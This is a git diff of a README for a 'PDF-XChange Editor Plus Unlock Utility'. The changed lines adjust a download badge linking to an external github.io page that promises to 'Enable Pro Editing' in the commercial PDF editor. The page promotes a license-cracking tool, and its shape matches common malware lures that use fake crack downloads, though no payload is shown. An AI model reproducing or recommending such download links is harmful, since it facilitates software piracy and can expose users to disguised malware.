@@ -6,11 +6,12 @@
 <h1 align="center">📝 PDF-XChange Editor Plus Unlock Utility</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/113" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20PDF-XChange%20Unlock-Enable%20Pro%20Editing-007ACC?style=for-the-badge&logo=pdf&logoColor=white" 
-         alt="Download PDF-XChange Unlock Tool" style="width: 540px; height: 37px;">
+  <a href="https://hiopal3847.github.io/.github/113" target="_blank" style="text-decoration: none;">
+    <img src="https://img.shields.io/badge/Download%20PDF--XChange%20Unlock-Enable%20Pro%20Editing-007ACC?style=for-the-badge&logo=adobeacrobatreader&logoColor=white" 
+         alt="Download PDF-XChange Unlock Tool" />
   </a>
 </p>
+
 
 <!-- Tool Preview -->
 <p align="center">
